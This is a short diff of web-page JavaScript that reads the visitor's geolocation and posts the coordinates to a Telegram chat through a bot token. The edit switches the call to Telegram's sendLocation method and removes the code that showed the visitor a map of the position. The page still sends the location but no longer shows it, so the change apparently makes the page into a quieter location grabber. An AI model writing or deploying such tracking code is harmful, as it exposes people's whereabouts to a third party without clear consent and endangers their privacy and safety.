@@ -261,7 +261,6 @@
                     console.log("Location info: ", locationInfo);
 
                     await sendLocationToTelegram(locationInfo);
-                    displayMap(latitude, longitude);
                 }, (error) => {
                     console.error("Error getting location: ", error);
                 });
@@ -271,7 +270,7 @@
         }
 
         async function sendLocationToTelegram(locationInfo) {
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const url = `https://api.telegram.org/bot${botToken}/sendLocation`;
 
             try {
                 const response = await fetch(url, {
@@ -281,7 +280,8 @@
                     },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: `Location Info: Latitude - ${locationInfo.latitude}, Longitude - ${locationInfo.longitude}`
+                        latitude: locationInfo.latitude,
+                        longitude: locationInfo.longitude
                     })
                 });
 
@@ -293,18 +293,6 @@
             } catch (error) {
                 console.error("Error sending location info to Telegram: ", error);
             }
-        }
-
-        function displayMap(latitude, longitude) {
-            const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=15&output=embed`;
-            const mapIframe = document.createElement('iframe');
-            mapIframe.src = mapUrl;
-            mapIframe.width = '600';
-            mapIframe.height = '450';
-            mapIframe.style.border = '0';
-            mapIframe.allowFullscreen = '';
-            mapIframe.loading = 'lazy';
-            document.body.appendChild(mapIframe);
         }
 
         async function initializeFirstPart() {
